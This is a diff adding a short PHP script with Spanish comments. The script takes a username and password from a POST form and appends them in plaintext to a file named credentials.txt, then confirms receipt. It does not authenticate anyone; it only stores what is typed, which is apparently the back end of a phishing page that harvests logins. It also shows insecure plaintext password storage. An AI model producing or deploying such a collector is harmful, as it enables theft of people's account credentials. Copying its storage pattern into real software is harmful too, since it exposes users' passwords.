@@ -1,0 +1,24 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    // Verifica si los datos no están vacíos
+    if (!empty($username) && !empty($password)) {
+        // Abre el archivo en modo de escritura
+        $file = fopen("credentials.txt", "a");
+
+        // Escribe los datos en el archivo
+        fwrite($file, "Usuario: $username\nContraseña: $password\n\n");
+
+        // Cierra el archivo
+        fclose($file);
+
+        echo "Datos recibidos exitosamente!";
+    } else {
+        echo "Por favor, completa ambos campos.";
+    }
+} else {
+    echo "Método de solicitud no válido.";
+}
+?>
